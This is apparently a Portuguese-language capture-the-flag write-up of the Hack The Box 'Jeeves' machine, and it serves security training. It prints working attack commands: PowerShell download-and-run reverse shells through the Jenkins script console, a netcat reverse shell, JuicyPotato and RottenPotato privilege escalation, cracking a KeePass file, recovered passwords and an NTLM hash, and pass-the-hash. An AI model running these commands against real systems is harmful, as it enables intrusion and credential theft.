---
title: "Hack The Box - Jeeves"
tags: [Windows,Medium,Gobuster,Jenkins,Nishang,JuicyPotato,Metasploit,Unicorn,Pass The Hash,Impacket,Web]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/114>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 4 portas abertas no servidor

> Portas 80 e 50000 - Servidor Web

> Portas 135 e 445 - Servidor Samba

## Enumeração da Porta 80

Primeiro passo é abrir a página do browser pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_web.png)

Aqui não iremos encontrar nada

## Enumeração da Porta 50000

Abrimos a página na web e verificamos que está rodando um 9.4.z-SNAPSHOT

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_web1.png)

Rodamos um Gobuster nessa página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_gobuster.png)

Explicação Gobuster

`gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

dir -u -> Modo diretórios no site http://10.10.10.63:50000

-w -> Wordlist utilizada

Então vamos entrar nesse `askjeeves` que ele encontrou

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_web2.png)

Encontramos algo interessante!

`Jenkins é um servidor de automação open source. Ele ajuda na automatização e desenvolvimento de softwares relativos à construção, teste e desenvolvimento, facilitando a continuidade da integração`

Temos dois modos de explorar ele

# Explorando Jenkins Askjeeves (1ºModo - NewJob)

O primeiro modo de se explorar ele é através da criação de um NewJob. Clicamos em `NewItem` e somos redirecionados a página

Digitamos o nome do projeto e clicamos em `Freestyle Project`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_web3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_web4.png)

Agora colocamos o comando para ser executado em `Build` - Execute Windows Batch Command

`powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_web5.png)

Para isso devemos ter nosso Nishang já preparado na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_n.png)

> https://github.com/samratashok/nishang

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_n1.png)

Alteramos para a última linha ser a chamada de um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_n3.png)

Clicamos em `Save` e agora executamos no servidor (lembrar de já ter o nc aberto na Kali) clicando em `Build Now`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_web6.png)

Conseguimos uma Shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_web7.png)

# Explorando Jenkins Askjeeves (2ºModo - Manage Jenkins)

Agora vamos fazer de outro modo. Na minha opinião melhor, uma vez que é menos ruidoso e escrachado como o anterior

Clicamos em `Manage Jenkins`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_man.png)

Depois em `Script Console`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_man1.png)

Somos levados até essa tela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_man2.png)

Verificamos que se trata de `Groovy Script`, é bom darmos uma olhada nele pra ver como ele vai aceitar os parâmetros para executar comandos

> https://www.guru99.com/groovy-tutorial.html

Executamos o comando whoami pra ver se realmente temos RCE

```
cmd = "whoami"
println cmd.execute().text
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_man3.png)

Clicamos em `Run`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_man4.png)

Temos RCE! Agora é só executar o comando do powershell ali e receber a shell na Kali

```
cmd = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')"
println cmd.execute().text
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_man5.png)

Ganhamos a shell!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_man6.png)

Bom, tem outras maneiras, mas assim já ta bom. Vamos continuar na escalação de privilégio. Vamos demonstrar de diversas maneiras como se escalar privilégio nessa máquina

# Escalação de Privilégio (1º Modo - RottenPotato)

Com o comando `whoami /priv` verificamos as permissões dos Tokens que esse usuário tem, ele possui o `SeImpersonatePrivilege` habilitado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_priv.png)

Um bom artigo para ler e aprender mais de como explorar esses tokens é esse:

`https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/`

Excepcional explicação dele sobre como funciona essa exploração

Os Tokens que podem ser explorados e estão explicados no blog são:

```
SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
```

A impersonação de token você pode usar um local admin e virar outro usuário logado no sistema. É muito útil em cenários os quais vc quer se tornar administrator, por exemplo.

Pesquisando sobre como explorar ela, encontramos um GitHub do `PayloadAllTheThings` que explica e nos disponibiliza binários já prontos 

`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r.png)

Então baixamos ele para nossa máquina

> https://github.com/ohpe/juicy-potato/releases

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r2.png)

Passamos para a máquina Jeeves através do `Impacket Smb Server`

`Kali`

*impacket-smbserver jeeves $(pwd)*

`Windows`

*net use z: \\10.10.16.117\jeeves*

ou

*New-PSDRive -Name "jeeves" -PSProvider "FileSystem" -Root "\\10.10.16.117\jeeves"*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r4.png)

Colocamos o nc.exe lá dentro, pra quando executar como root me dar um shell de root, colocamos ele na pasta que está sendo compartilhada com o Jeeves e copiamos ele para o diretório `C:\Users\kohsuke\Downloads`

`xcopy nc64.exe C:\\Users\\kohsuke\\Downloads\\nc64.exe /e /y`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r7.png)

Crio o arquivo .bat para ser executado

`echo C:\Users\kohsuke\Downloads\nc64.exe -e cmd.exe 10.10.16.117 3333 > rev.bat`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r8.png)

Também copiamos o JuicyPotato.exe, pra ficar mais fácil de trabalhar

`copy JuicyPotato.exe C:\\Users\\kohsuke\\Downloads\\JuicyPotato.exe`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r9.png)

Bom, para o JuicyPotato.exe funcionar corretamente, devemos estar em um shell normal, no powershell geralmente ele da uns bug maluco, então vamos pegar uma reverse shell de cmd.exe com o nc64.exe que foi posto ali dentro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r10.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r11.png)

Agora executamos o JuicyPotato.exe e ganhamos acesso de root

Devemos pegar o CLSID do sistema que está rodando, o que eu usei foi o `e60687f7-01a1-40aa-86ac-db1cbf673334` que está presente em todos e tem permissões de authority, é a respeito do serviço `wuauserv`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_cl.png)

`JuicyPotato.exe -p C:\Users\kohsuke\Downloads\rev.bat -l 3333 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_r12.png)

Sim, deu um trabalinho bem grande até, mais do que eu esperava, mas é isso ai

# Escalação de Privilégio (2ºModo - CEH.kdbx - Pass The Hash)

Outro modo que vamos encontrar para explorar essa máquina e escalar privilégio é através do arquivo de senha .kbdx que se encontra dentro da pasta `Documents` do usuário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k.png)

Copiamos para a pasta da Kali que foi compartilhada no método anterior

`copy CEH.kdbx jeeves:\\CEH.kdbx`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k1.png)

O que é .kdbx?

```
Os arquivos de dados criados por KeePass Password Safe são conhecidos como arquivos KDBX e eles costumam se referir ao KeePass Password Banco de Dados. Esses arquivos contêm senhas em um banco de dados criptografado que eles só podem ser vistas se o usuário configurar uma senha mestre e acessados ​​através deles que a senha mestre. KDBX arquivos são úteis quando se trata de o armazenamento seguro de credenciais pessoais login para as contas de e-mail, sites de e-commerce, Windows, sites FTP e outros fins
```

Com o keepass2john convertemos pra poder quebrar a senha dele

`keepass2john CEH.kdbx > hash`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k2.png)

Com o john quebramos a senha do arquivo (demora um pouquinho)

`john hash --wordlist=/usr/share/wordlists/rockyou.tx`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k3.png)

Descobrimos que a senha desse chaveiro de senhas é `moonshine1`

Instalamos o `keepassx` que é a aplicação que lê esse tipo de arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k5.png)

Abrimos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k6.png)

Encontramos três senhas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k7.png)

`administrator:S1TjAtJHKsugh9oC4VZl`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k8.png)

`Hash NTLM = aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_k9.png)

`bob:lCEUnYPjNfIuPZSzOySA`

Tentamos nos logar com o `psexec.py` mas não deu muito certo...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_pe.png)

## Pass-The-Hash

Como sabemos que temos um hash ai, ele não deve estar a toa, vamos tentar fazer o `Pass-The-Hash` com ele

`pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe`

Sim! Conseguimos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_pth.png)

# Escalação de Privilégio (3ºModo - Unicorn - Meterpreter)

Outro modo que vamos explorar a máquina é através do Unicorn, ganhando um shell de meterpreter e abusando dos tokens por ai

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u1.png)

> python unicorn.py windows/meterpreter/reverse_tcp 10.10.16.117 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u2.png)

Copiamos o `powershell_attack.txt` para a pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u3.png)

Iniciamos o `msfconsole`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u4.png)

Agora executamos o `powershell_attack.txt` na máquina Jeeves, para ganharmos o shell de meterpreter

`IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/powershell_attack.txt')`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u5.png)

Bom agora passamos o `rottenpotato.exe` para dentro dele (no campo Usage do github tem o passo a passo para utilização que vamos fazer aqui)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_rotten.png)

> https://github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_rotten1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u6.png)

Agora com o `incognito` carregamos ele para ver todos os tokens que temos

`load incognito`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u7.png)

Listamos todos os tokens com o comando `list_tokens -g`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u8.png)

Verificamos que não tem nenhum token impersonation de administrador, então com o JuicyPotato.exe que baixamos, executamos ele

`execute -cH -f rottenpotato.exe`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u9.png)

Listamos todos os tokens com o comando `list_tokens -g`, e vemos que temos tokens agora de administrador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u10.png)

Agora é só habilitar o token que conseguimos

`impersonate_token "BUILTIN\\Administrators"`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u11.png)

Confirmando, viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_u12.png)

## Pegando flag de user e root

Agora é só pegar as flags de user e root

Ao entrarmos na pasta do root, vemos que não existe root.txt, só um arquivo hm.txt, então vemos do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J-root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J-root1.png)

Bom, pelo que parece está oculta ou algo assim, com o `dir /R` verificamos mais a fundo os arquivos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J-root2.png)

Temos dois modos de se conseguir essa flag, atráves do Powershell

`powershell (Get-Content hm.txt -Stream root.txt)`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_root.png)

Ou através do more

`more < hm.txt:root.txt:$DATA`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_root1.png)

E agora a flag de user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jeeves/J_user.png)